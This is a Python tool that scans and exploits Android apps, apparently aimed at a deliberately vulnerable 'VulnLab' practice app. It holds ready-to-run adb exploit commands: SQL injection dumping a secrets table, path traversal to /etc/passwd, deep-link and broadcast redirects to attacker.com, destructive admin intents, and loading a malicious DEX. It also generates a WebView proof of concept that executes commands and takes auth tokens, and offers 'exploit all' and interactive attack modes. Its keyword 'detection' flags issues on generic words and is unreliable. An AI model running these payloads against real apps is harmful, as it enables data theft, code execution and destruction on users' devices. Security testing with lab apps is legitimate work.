#!/usr/bin/env python3
"""
Advanced APK WebView Checker - Enhanced version with apktool integration and decompilation
Includes VulnLab test cases (11.1-11.9) from OWASP Mobile Top 10
"""

import zipfile
import os
import sys
import argparse
import json
import re
import subprocess
import xml.etree.ElementTree as ET
from pathlib import Path
from typing import List, Dict, Tuple, Optional, Set
from dataclasses import dataclass, asdict, field
import tempfile
import shutil


# ============================================================================
# VULNERABILITY DATABASE - VulnLab OWASP Mobile Top 10 Test Cases
# ============================================================================

VULNERABILITY_DATABASE = {
    "11.1": {
        "name": "Component Exposure & Insecure IPC",
        "type": "Insecure Component Exposure",
        "cvss": 9.1,
        "activity": "AdminActivity",
        "test_command": 'adb shell am start -n {package}/.AdminActivity --ez isAdmin true --es action deleteAll',
        "description": "Exported Activity without proper permissions allowing unauthorized access",
        "test_keywords": ["exported", "activity", "intent-filter", "android:exported"],
        "remediation": "Set android:exported=false or define proper permissions"
    },
    "11.2a": {
        "name": "Intent Redirection",
        "type": "Insecure IPC",
        "cvss": 8.3,
        "activity": "IntentRedirectReceiver",
        "test_command": 'adb shell am start -a android.intent.action.VIEW -d "vulnlab://redirect?url=http://attacker.com"',
        "description": "Intent redirection to arbitrary URLs via deep links",
        "test_keywords": ["intent-filter", "scheme", "path", "pathPrefix", "redirect"],
        "remediation": "Validate intent data and use strict URL validation"
    },
    "11.2b": {
        "name": "PendingIntent Misuse",
        "type": "Insecure IPC",
        "cvss": 7.5,
        "activity": "PendingIntentActivity",
        "test_command": 'adb shell am broadcast -a {package}.TRIGGER_INTENT',
        "description": "PendingIntent without proper flags allowing interception",
        "test_keywords": ["PendingIntent", "getBroadcast", "getService", "getActivity"],
        "remediation": "Use FLAG_IMMUTABLE flag (API 23+) or FLAG_UPDATE_CURRENT with validation"
    },
    "11.3a": {
        "name": "ContentProvider SQL Injection",
        "type": "Data Access Vulnerability",
        "cvss": 9.8,
        "activity": "VulnContentProvider",
        "test_command": 'adb shell content query --uri content://{package}.provider/users --where "1=1 UNION SELECT key,value,null,null,null FROM secrets--"',
        "description": "SQL Injection in ContentProvider query method",
        "test_keywords": ["ContentProvider", "query", "SQLiteDatabase", "rawQuery", "selection"],
        "remediation": "Use parameterized queries and PreparedStatements"
    },
    "11.3b": {
        "name": "ContentProvider Path Traversal",
        "type": "Data Access Vulnerability",
        "cvss": 8.6,
        "activity": "FileVulnProvider",
        "test_command": 'adb shell content query --uri content://{package}.provider/files/../../../etc/passwd',
        "description": "Path traversal in ContentProvider file access",
        "test_keywords": ["ContentProvider", "ParcelFileDescriptor", "File", "getBaseContext"],
        "remediation": "Validate and sanitize all file paths, use canonical paths"
    },
    "11.4a": {
        "name": "Deep Link Parameter Injection",
        "type": "Deep Link Vulnerability",
        "cvss": 8.1,
        "activity": "DeepLinkActivity",
        "test_command": 'adb shell am start -a android.intent.action.VIEW -d "vulnlab://app/reset?token=INJECTED_TOKEN"',
        "description": "Deep links accepting untrusted parameters leading to injection attacks",
        "test_keywords": ["deep-link", "android:scheme", "android:host", "android:path", "getIntent"],
        "remediation": "Validate all deep link parameters, use allowlist for permitted values"
    },
    "11.4b": {
        "name": "OAuth Token Hijacking",
        "type": "Deep Link Vulnerability",
        "cvss": 8.1,
        "activity": "DeepLinkActivity",
        "test_command": 'adb shell am start -a android.intent.action.VIEW -d "vulnlab://oauth?code=STOLEN_CODE&state=INJECTED"',
        "description": "Insecure OAuth implementation via deep links",
        "test_keywords": ["oauth", "deep-link", "redirect_uri", "state", "code"],
        "remediation": "Implement strict state parameter validation, use PKCE for authorization"
    },
    "11.5": {
        "name": "Broadcast Receiver Hijack",
        "type": "Insecure IPC",
        "cvss": 7.4,
        "activity": "ConfigReceiver",
        "test_command": 'adb shell am broadcast -n {package}/.ConfigReceiver --es server_url "http://attacker.com" --ez force_update true',
        "description": "Unprotected BroadcastReceiver allowing configuration hijacking",
        "test_keywords": ["BroadcastReceiver", "intent-filter", "exported", "onReceive"],
        "remediation": "Require permission for broadcast receivers, use LocalBroadcastManager"
    },
    "11.6": {
        "name": "Insecure Data Storage",
        "type": "Data Storage Vulnerability",
        "cvss": 7.5,
        "activity": "StorageActivity",
        "test_command": 'adb shell run-as {package} cat /data/data/{package}/shared_prefs/vulnlab_prefs.xml',
        "description": "Sensitive data stored without encryption in SharedPreferences or files",
        "test_keywords": ["SharedPreferences", "MODE_WORLD_READABLE", "MODE_WORLD_WRITABLE", "getSharedPreferences"],
        "remediation": "Encrypt sensitive data, use EncryptedSharedPreferences, avoid storage on external storage"
    },
    "11.7": {
        "name": "Cryptography Failures",
        "type": "Cryptography Vulnerability",
        "cvss": 7.5,
        "activity": "CryptoActivity",
        "test_command": 'adb shell am start -n {package}/.CryptoActivity && adb logcat -d | grep VulnLab:Crypto',
        "description": "Hardcoded keys, weak algorithms (MD5, ECB, DES), predictable IVs",
        "test_keywords": ["Cipher.getInstance", "ECB", "MD5", "DES", "hardcoded", "static", "random"],
        "remediation": "Use AES-GCM, avoid ECB mode, generate random IVs, never hardcode keys"
    },
    "11.8": {
        "name": "Insecure WebView + JS Bridge",
        "type": "WebView Vulnerability",
        "cvss": 9.3,
        "activity": "WebViewActivity",
        "test_command": 'adb push /tmp/poc.html /data/local/tmp/poc.html && adb shell run-as {package} cp /data/local/tmp/poc.html /data/data/{package}/files/poc.html && adb shell am start -n {package}/.WebViewActivity --es url "file:///data/data/{package}/files/poc.html"',
        "description": "WebView with enabled JavaScript bridge (addJavascriptInterface) allowing RCE",
        "test_keywords": ["WebView", "addJavascriptInterface", "setJavaScriptEnabled", "loadUrl"],
        "remediation": "Disable JavaScript if not needed, validate bridge inputs, use strict origins"
    },
    "11.9": {
        "name": "Dynamic Code Loading",
        "type": "Code Injection Vulnerability",
        "cvss": 8.8,
        "activity": "DynamicCodeActivity",
        "test_command": 'adb push malicious.dex /sdcard/vulnlab_plugins/update.dex && adb shell am start -n {package}/.DynamicCodeActivity',
        "description": "Dynamic code loading from untrusted sources without signature verification",
        "test_keywords": ["DexClassLoader", "loadClass", "newInstance", "Plugin", "ClassLoader"],
        "remediation": "Verify DEX signatures, use code signing, avoid dynamic loading from external sources"
    }
}


@dataclass
class VulnerabilityFinding:
    vuln_id: str
    vuln_name: str
    cvss_score: float
    severity: str
    detected: bool
    keywords_found: List[str] = field(default_factory=list)
    files_affected: List[str] = field(default_factory=list)
    test_command: Optional[str] = None
    remediation: Optional[str] = None


@dataclass
class WebViewComponent:
    name: str
    type: str
    has_webview: bool = False
    files_with_webview: List[str] = field(default_factory=list)
    security_issues: List[str] = field(default_factory=list)


class AdvancedAPKWebViewChecker:
    def __init__(self, apk_path: str = "", use_apktool: bool = False, verbose: bool = False, package_name: Optional[str] = None):
        self.apk_path = apk_path or ""
        self.use_apktool = use_apktool
        self.verbose = verbose
        self.temp_dir = None
        self.extracted_dir = None
        self.package_name = package_name or ""
        self.components: Dict[str, WebViewComponent] = {}
        self.webview_methods: Set[str] = set()

    def log(self, message: str, level: str = "INFO"):
        if self.verbose or level in ["ERROR", "WARNING"]:
            prefix = "  " if level in ["DEBUG"] else ""
            print(f"{prefix}[{level}] {message}")

    def check_apktool_available(self) -> bool:
        try:
            result = subprocess.run(['apktool', '--version'], capture_output=True, text=True)
            return result.returncode == 0
        except FileNotFoundError:
            return False

    def check_adb_connected(self) -> bool:
        try:
            result = subprocess.run(["adb", "devices"], capture_output=True, text=True, timeout=5)
            lines = [l.strip() for l in result.stdout.split('\n') if l.strip() and 'device' in l.lower()]
            return len(lines) > 0 and result.returncode == 0
        except Exception as e:
            self.log(f"ADB check failed: {str(e)}", "WARNING")
            return False

    def pull_installed_apk(self) -> bool:
        if not self.package_name:
            self.log("No package name available", "ERROR")
            return False

        if not self.check_adb_connected():
            self.log("Device not connected via ADB. Ensure USB connection and ADB is enabled.", "ERROR")
            return False

        result = subprocess.run(["adb", "shell", "pm", "path", self.package_name], capture_output=True, text=True, timeout=10)
        if result.returncode != 0 or not result.stdout.strip():
            self.log(f"Package not found: {self.package_name}", "ERROR")
            return False

        remote_paths = [line.strip() for line in result.stdout.splitlines() if line.strip()]
        if not remote_paths:
            self.log(f"No APK path returned", "ERROR")
            return False

        remote_path = remote_paths[0].replace("package:", "").strip()
        if not remote_path:
            self.log(f"Invalid APK path", "ERROR")
            return False

        if not self.temp_dir:
            self.temp_dir = tempfile.mkdtemp()

        local_apk_path = os.path.join(self.temp_dir, f"{self.package_name.replace('.', '_')}.apk")
        result = subprocess.run(["adb", "pull", remote_path, local_apk_path], capture_output=True, text=True, timeout=30)
        if result.returncode != 0:
            self.log(f"Failed to pull APK: {result.stderr.strip()}", "ERROR")
            return False

        self.apk_path = local_apk_path
        self.log(f"Pulled APK to {self.apk_path}")
        return True

    def extract_with_apktool(self) -> bool:
        try:
            if not self.temp_dir:
                self.temp_dir = tempfile.mkdtemp()
            self.extracted_dir = os.path.join(self.temp_dir, "apktool")
            self.log(f"Extracting with apktool to {self.extracted_dir}")
            result = subprocess.run(['apktool', 'd', self.apk_path, '-o', self.extracted_dir, '-f'], capture_output=True, text=True)
            if result.returncode != 0:
                self.log(f"apktool failed: {result.stderr}", "ERROR")
                return False
            self.log("APK extracted successfully")
            return True
        except Exception as e:
            self.log(f"Failed: {str(e)}", "ERROR")
            return False

    def extract_with_zipfile(self) -> bool:
        try:
            if not os.path.exists(self.apk_path):
                self.log(f"APK not found: {self.apk_path}", "ERROR")
                return False
            if not self.temp_dir:
                self.temp_dir = tempfile.mkdtemp()
            self.extracted_dir = os.path.join(self.temp_dir, "extracted")
            os.makedirs(self.extracted_dir, exist_ok=True)
            self.log(f"Extracting to {self.extracted_dir}")
            with zipfile.ZipFile(self.apk_path, 'r') as zip_ref:
                zip_ref.extractall(self.extracted_dir)
            self.log("APK extracted successfully")
            return True
        except Exception as e:
            self.log(f"Failed: {str(e)}", "ERROR")
            return False

    def extract(self) -> bool:
        if self.package_name and not self.apk_path:
            if not self.pull_installed_apk():
                return False
        if self.use_apktool and self.check_apktool_available():
            return self.extract_with_apktool()
        else:
            if self.use_apktool:
                self.log("apktool unavailable, using zipfile", "WARNING")
            return self.extract_with_zipfile()

    def parse_manifest_xml(self) -> bool:
        try:
            root_dir = self.extracted_dir or self.temp_dir
            manifest_path = os.path.join(root_dir, "AndroidManifest.xml")
            if not os.path.exists(manifest_path):
                self.log("AndroidManifest.xml not found", "WARNING")
                return False
            try:
                tree = ET.parse(manifest_path)
                root = tree.getroot()
                ns = {'android': 'http://schemas.android.com/apk/res/android'}
                for activity in root.findall('.//activity', ns):
                    name = activity.get('{http://schemas.android.com/apk/res/android}name')
                    if name:
                        self.components[name] = WebViewComponent(name=name, type="ACTIVITY")
                        self.log(f"Found activity: {name}")
                if not self.package_name:
                    pkg = root.get('package')
                    if pkg:
                        self.package_name = pkg
                        self.log(f"Package name: {pkg}")
                return True
            except ET.ParseError:
                self.log("Binary XML format", "DEBUG")
                return True
        except Exception as e:
            self.log(f"Failed: {str(e)}", "ERROR")
            return False

    def analyze_source_code(self) -> Dict[str, List[str]]:
        findings = {}
        webview_patterns = {
            'webview': r'WebView|android\.webkit\.WebView',
            'javascript': r'setJavaScriptEnabled|evaluateJavascript',
            'file_access': r'setAllowFileAccess|file://',
            'javascript_interface': r'addJavascriptInterface',
            'dom_storage': r'setDomStorageEnabled',
            'database': r'setDatabaseEnabled',
            'mixed_content': r'MIXED_CONTENT_ALWAYS_ALLOW',
            'custom_client': r'WebViewClient|WebChromeClient',
            'load_url': r'loadUrl|loadData',
        }
        root_dir = self.extracted_dir or self.temp_dir
        for source_dir in [os.path.join(root_dir, "sources"), os.path.join(root_dir, "smali")]:
            if not os.path.exists(source_dir):
                continue
            for root, dirs, files in os.walk(source_dir):
                for file in files:
                    if file.endswith(('.java', '.smali', '.xml')):
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                for pattern_name, pattern in webview_patterns.items():
                                    if re.search(pattern, content, re.IGNORECASE):
                                        if pattern_name not in findings:
                                            findings[pattern_name] = []
                                        findings[pattern_name].append(os.path.relpath(file_path, self.temp_dir))
                        except Exception:
                            pass
        return findings

    def analyze_dex_bytecode(self) -> Dict[str, List[str]]:
        findings = {}
        try:
            root_dir = self.extracted_dir or self.temp_dir
            dex_files = [os.path.join(root, f) for root, _, files in os.walk(root_dir) for f in files if f.endswith('.dex')]
            webview_patterns = [b'android/webkit/WebView', b'WebViewClient', b'WebChromeClient', b'setJavaScriptEnabled', b'addJavascriptInterface']
            for dex_path in dex_files:
                with open(dex_path, 'rb') as f:
                    content = f.read()
                    for pattern in webview_patterns:
                        if pattern in content:
                            pattern_name = pattern.decode('latin1')
                            if pattern_name not in findings:
                                findings[pattern_name] = []
                            findings[pattern_name].append(os.path.basename(dex_path))
        except Exception as e:
            self.log(f"DEX analysis failed: {str(e)}", "ERROR")
        return findings

    def test_vulnerability_owasp(self, source_findings: Dict, dex_findings: Dict) -> List[VulnerabilityFinding]:
        vulns_found = []
        all_content = str(source_findings) + str(dex_findings)
        for vuln_id, vuln_info in VULNERABILITY_DATABASE.items():
            finding = VulnerabilityFinding(
                vuln_id=vuln_id,
                vuln_name=vuln_info["name"],
                cvss_score=vuln_info["cvss"],
                severity="CRITICAL" if vuln_info["cvss"] >= 9.0 else "HIGH" if vuln_info["cvss"] >= 7.0 else "MEDIUM",
                detected=False,
                test_command=vuln_info.get("test_command"),
                remediation=vuln_info.get("remediation")
            )
            for keyword in vuln_info.get("test_keywords", []):
                if keyword.lower() in all_content.lower():
                    finding.detected = True
                    finding.keywords_found.append(keyword)
            if finding.detected:
                vulns_found.append(finding)
                self.log(f"[{vuln_id}] {vuln_info['name']} (CVSS: {vuln_info['cvss']})")
        return vulns_found

    def list_vulnerabilities(self) -> None:
        print("\nVulnLab Vulnerability Test Cases:")
        print("-" * 60)
        for vuln_id, vuln_info in VULNERABILITY_DATABASE.items():
            print(f"  {vuln_id:5}  {vuln_info['name']}")
        print("-" * 60 + "\n")

    def get_vulnerability(self, vuln_id: str) -> Optional[Dict]:
        return VULNERABILITY_DATABASE.get(vuln_id)

    def create_webview_poc_html(self, poc_path: Optional[str] = None) -> str:
        if poc_path is None:
            poc_path = os.path.join(tempfile.gettempdir(), "vulnlab_poc.html")
        prefs_path = f"/data/data/{self.package_name}/shared_prefs/vulnlab_prefs.xml"
        poc_content = f'''<html>
<head><title>VulnLab WebView PoC</title></head>
<body>
<script>
  try {{
    var cmd = Android.execCommand("id");
    var prefs = Android.readFile("{prefs_path}");
    var token = Android.getAuthToken();
    document.body.innerHTML = "<pre>CMD: " + cmd + "\\nPREFS:\\n" + prefs + "\\nTOKEN: " + token + "</pre>";
  }} catch (e) {{
    document.body.innerText = "PoC failed: " + e;
  }}
</script>
</body>
</html>
'''
        with open(poc_path, "w", encoding="utf-8") as f:
            f.write(poc_content)
        self.log(f"Generated PoC HTML at {poc_path}")
        return poc_path

    def run_shell_command(self, command: str, timeout: int = 30) -> subprocess.CompletedProcess:
        normalized = command
        if os.name == 'nt' and '| grep ' in normalized:
            normalized = normalized.replace('| grep ', '| findstr ')
            self.log(f"Normalized grep to findstr for Windows: {normalized}", "DEBUG")
        self.log(f"Running: {normalized}", "DEBUG")
        try:
            return subprocess.run(normalized, shell=True, capture_output=True, text=True, timeout=timeout)
        except subprocess.TimeoutExpired as ex:
            self.log(f"Command timed out after {timeout}s: {normalized}", "WARNING")
            completed = subprocess.CompletedProcess(ex.cmd, 124, output=(ex.output or ""), stderr=(ex.stderr or "Timeout expired"))
            return completed

    def resolve_test_command(self, command: str) -> str:
        if "{package}" in command and not self.package_name:
            raise ValueError("Package name required. Use --package option.")
        return command.format(package=self.package_name) if self.package_name else command

    def exploit_vulnerability(self, vuln_id: str) -> int:
        vuln_info = self.get_vulnerability(vuln_id)
        if not vuln_info:
            print(f"Unknown ID: {vuln_id}")
            return 1
        print(f"\nExploiting [{vuln_id}] {vuln_info['name']}")
        if vuln_id == "11.8":
            poc_path = self.create_webview_poc_html()
            cmds = [
                f'adb push "{poc_path}" /data/local/tmp/poc.html',
                self.resolve_test_command(vuln_info.get("test_command", ""))
            ]
            for cmd in cmds:
                result = self.run_shell_command(cmd)
                if result.stdout:
                    print(result.stdout.strip())
                if result.returncode != 0:
                    if result.stderr:
                        print(result.stderr.strip())
                    return result.returncode
            return 0
        command = self.resolve_test_command(vuln_info.get("test_command", ""))
        if not command:
            print("No exploit command configured")
            return 1
        result = self.run_shell_command(command)
        if result.stdout:
            print(result.stdout.strip())
        if result.returncode != 0 and result.stderr:
            print(result.stderr.strip())
        return result.returncode

    def prompt_exploit_selection(self) -> None:
        self.list_vulnerabilities()
        while True:
            choice = input("Enter vulnerability ID to exploit (or q to quit): ").strip()
            if choice.lower() in {"q", "quit", "exit"}:
                print("Exiting")
                break
            if not self.get_vulnerability(choice):
                print(f"Invalid: {choice}")
                continue
            result = self.exploit_vulnerability(choice)
            if result == 0:
                print("Exploit completed.")
            else:
                print(f"Exit code: {result}")
            again = input("Run another? [y/N]: ").strip().lower()
            if again not in {"y", "yes"}:
                break

    def scan_vulnerabilities(self) -> Dict:
        try:
            if self.package_name and not self.apk_path:
                if not self.pull_installed_apk():
                    return {'error': 'Failed to pull installed APK'}
            if not self.apk_path:
                return {'error': 'No APK available for analysis'}

            if not self.extract():
                return {'error': 'Failed to extract APK for scan'}
            self.parse_manifest_xml()

            scan_results = []
            for vuln_id, vuln_info in VULNERABILITY_DATABASE.items():
                command = vuln_info.get('test_command') or ''
                expected = {'vuln_id': vuln_id, 'name': vuln_info['name'], 'command': command, 'returncode': None, 'stdout': '', 'stderr': ''}
                if not command:
                    expected['stderr'] = 'No command configured'
                    scan_results.append(expected)
                    continue
                try:
                    resolved = self.resolve_test_command(command)
                except ValueError as e:
                    expected['stderr'] = str(e)
                    scan_results.append(expected)
                    continue
                result = self.run_shell_command(resolved)
                expected['returncode'] = result.returncode
                expected['stdout'] = result.stdout.strip()
                expected['stderr'] = result.stderr.strip()
                scan_results.append(expected)
                if result.returncode != 0:
                    self.log(f"[{vuln_id}] scan command failed: {result.stderr.strip()}", "WARNING")
            return {
                'file': self.apk_path,
                'package': self.package_name,
                'scan_results': scan_results,
                'total_checked': len(scan_results),
                'failures': sum(1 for r in scan_results if r['returncode'] not in (0, None))
            }
        finally:
            self.cleanup()

    def exploit_all_vulnerabilities(self) -> Dict:
        if not self.package_name:
            return {'error': 'Package name required for exploitation'}
        exploit_results = []
        for vuln_id, vuln_info in VULNERABILITY_DATABASE.items():
            command = vuln_info.get('test_command') or ''
            result_entry = {'vuln_id': vuln_id, 'name': vuln_info['name'], 'command': command, 'returncode': None, 'stdout': '', 'stderr': ''}
            if not command:
                result_entry['stderr'] = 'No command configured'
                exploit_results.append(result_entry)
                continue
            try:
                resolved = self.resolve_test_command(command)
            except ValueError as e:
                result_entry['stderr'] = str(e)
                exploit_results.append(result_entry)
                continue
            result = self.run_shell_command(resolved)
            result_entry['returncode'] = result.returncode
            result_entry['stdout'] = result.stdout.strip()
            result_entry['stderr'] = result.stderr.strip()
            exploit_results.append(result_entry)
            if result.returncode != 0:
                self.log(f"[{vuln_id}] exploit command failed: {result.stderr.strip()}", "WARNING")
        return {
            'package': self.package_name,
            'exploit_results': exploit_results,
            'total_exploited': len(exploit_results),
            'failures': sum(1 for r in exploit_results if r['returncode'] not in (0, None))
        }

    def analyze(self) -> Dict:
        try:
            if not self.extract():
                return {'error': 'Failed to extract'}
            self.parse_manifest_xml()
            source_findings = self.analyze_source_code()
            dex_findings = self.analyze_dex_bytecode()
            vulnerability_findings = self.test_vulnerability_owasp(source_findings, dex_findings)
            results = {
                'file': self.apk_path,
                'package': self.package_name,
                'webview_found': bool(source_findings) or bool(dex_findings),
                'source_code_findings': source_findings,
                'dex_findings': dex_findings,
                'vulnerability_tests': [asdict(v) for v in vulnerability_findings],
                'vulnerability_summary': {
                    'total_tested': len(VULNERABILITY_DATABASE),
                    'vulnerabilities_found': len(vulnerability_findings),
                }
            }
            return results
        except Exception as e:
            self.log(f"Analysis failed: {str(e)}", "ERROR")
            return {'error': str(e)}
        finally:
            self.cleanup()

    def cleanup(self):
        if self.temp_dir and os.path.exists(self.temp_dir):
            try:
                shutil.rmtree(self.temp_dir)
                self.log("Cleaned up temp files")
            except Exception as e:
                self.log(f"Cleanup failed: {str(e)}", "WARNING")

    def generate_report(self, results: Dict, output_format: str = "text") -> str:
        if output_format == "json":
            return json.dumps(results, indent=2)
        report = []
        report.append("=" * 80)
        report.append("ADVANCED APK WebView Analysis Report")
        report.append("=" * 80)
        report.append(f"\nAPK: {results.get('file')}")
        report.append(f"Package: {results.get('package')}\n")
        if 'error' in results:
            report.append(f"Error: {results['error']}")
            return "\n".join(report)
        report.append(f"WebView Found: {'YES' if results['webview_found'] else 'NO'}\n")
        vuln_summary = results.get('vulnerability_summary', {})
        if vuln_summary:
            report.append("=" * 80)
            report.append("VULNERABILITY TEST SUMMARY")
            report.append("=" * 80)
            report.append(f"Tested: {vuln_summary.get('total_tested', 0)}")
            report.append(f"Found: {vuln_summary.get('vulnerabilities_found', 0)}\n")
        vuln_tests = results.get('vulnerability_tests', [])
        if vuln_tests:
            report.append("=" * 80)
            report.append("VULNERABILITY DETAILS")
            report.append("=" * 80)
            for vuln in sorted(vuln_tests, key=lambda x: x['cvss_score'], reverse=True):
                report.append(f"\n[{vuln['vuln_id']}] {vuln['vuln_name']} (CVSS: {vuln['cvss_score']})")
                if vuln.get('test_command'):
                    report.append(f"Command: {vuln['test_command']}")

        scan_results = results.get('scan_results', [])
        if scan_results:
            report.append("=" * 80)
            report.append("SCAN RESULTS")
            report.append("=" * 80)
            for scan in scan_results:
                status = 'PASS' if scan['returncode'] == 0 else 'FAIL' if scan['returncode'] is not None else 'UNKNOWN'
                report.append(f"\n[{scan['vuln_id']}] {scan['name']} - {status}")
                report.append(f"Command: {scan['command']}")
                if scan['stdout']:
                    report.append(f"Stdout: {scan['stdout']}")
                if scan['stderr']:
                    report.append(f"Stderr: {scan['stderr']}")

        exploit_results = results.get('exploit_results', [])
        if exploit_results:
            report.append("=" * 80)
            report.append("EXPLOIT RESULTS")
            report.append("=" * 80)
            for exploit in exploit_results:
                status = 'PASS' if exploit['returncode'] == 0 else 'FAIL' if exploit['returncode'] is not None else 'UNKNOWN'
                report.append(f"\n[{exploit['vuln_id']}] {exploit['name']} - {status}")
                report.append(f"Command: {exploit['command']}")
                if exploit['stdout']:
                    report.append(f"Stdout: {exploit['stdout']}")
                if exploit['stderr']:
                    report.append(f"Stderr: {exploit['stderr']}")
        report.append("\n" + "=" * 80)
        return "\n".join(report)


def main():
    parser = argparse.ArgumentParser(description='WebView/VulnLab analyzer with exploit selection')
    parser.add_argument('apk', nargs='?', help='APK file path')
    parser.add_argument('--package', help='Installed package name')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-j', '--json', action='store_true', help='JSON output')
    parser.add_argument('-o', '--output', help='Save report to file')
    parser.add_argument('--apktool', action='store_true', help='Use apktool')
    parser.add_argument('--list', action='store_true', help='List vulnerabilities')
    parser.add_argument('--list-only', action='store_true', help='List vulnerabilities only, do not scan')
    parser.add_argument('--scan', action='store_true', help='Scan the APK or installed package for vulnerabilities')
    parser.add_argument('--exploit-all', action='store_true', help='Exploit all vulnerability test cases sequentially')
    parser.add_argument('--scan-and-exploit', action='store_true', help='Scan and then exploit all vulnerability test cases')
    parser.add_argument('--exploit', help='Exploit vulnerability ID')
    parser.add_argument('--interactive', action='store_true', help='Interactive menu')

    args = parser.parse_args()

    # Auto-detect package name from positional argument
    if args.apk and not os.path.exists(args.apk):
        if '.' in args.apk and '\\' not in args.apk and '/' not in args.apk:
            args.package = args.apk
            args.apk = None

    if not args.apk and not args.package:
        print("Error: Provide APK file or use --package <name>")
        print("Examples:")
        print("  python check_webview_advanced.py /path/app.apk --interactive")
        print("  python check_webview_advanced.py --package com.example.app --exploit 11.1")
        sys.exit(1)

    if args.apk and not os.path.exists(args.apk):
        print(f"Error: APK not found: {args.apk}")
        sys.exit(1)

    checker = AdvancedAPKWebViewChecker(args.apk or "", use_apktool=args.apktool, verbose=args.verbose, package_name=args.package)

    if args.list:
        checker.list_vulnerabilities()
        if args.list_only:
            sys.exit(0)
        # continue to scan if a package or apk is provided and list_only is not set

    if args.exploit:
        sys.exit(checker.exploit_vulnerability(args.exploit))

    if args.interactive:
        checker.prompt_exploit_selection()
        sys.exit(0)

    if args.exploit_all or args.scan_and_exploit:
        if not args.package and not args.apk:
            print("Error: Provide APK file or --package <name> for exploit-all")
            sys.exit(1)
        if args.scan_and_exploit:
            print(f"Scanning installed package: {args.package or args.apk}\n")
            scan_results = checker.scan_vulnerabilities()
            print(checker.generate_report(scan_results, "json" if args.json else "text"))
            print("\nStarting exploitation of all vulnerabilities...\n")
        else:
            print("Exploiting all vulnerability test cases...\n")
        exploit_results = checker.exploit_all_vulnerabilities()
        output_format = "json" if args.json else "text"
        report = checker.generate_report(exploit_results, output_format)
        if args.output:
            with open(args.output, 'w') as f:
                f.write(report)
            print(f"Report saved to {args.output}")
        else:
            print(report)
        sys.exit(0)

    if args.scan or (args.list and not args.list_only):
        if args.scan:
            print(f"Scanning installed package: {args.package or args.apk}\n")
            results = checker.scan_vulnerabilities()
        else:
            if args.package and not args.apk:
                print(f"Analyzing installed package: {args.package}\n")
            else:
                print(f"Analyzing: {args.apk}\n")
            results = checker.analyze()

        output_format = "json" if args.json else "text"
        report = checker.generate_report(results, output_format)

        if args.output:
            with open(args.output, 'w') as f:
                f.write(report)
            print(f"Report saved to {args.output}")
        else:
            print(report)
    else:
        # No scan requested and list only was selected
        sys.exit(0)
    output_format = "json" if args.json else "text"
    report = checker.generate_report(results, output_format)

    if args.output:
        with open(args.output, 'w') as f:
            f.write(report)
        print(f"Report saved to {args.output}")
    else:
        print(report)


if __name__ == '__main__':
    main()
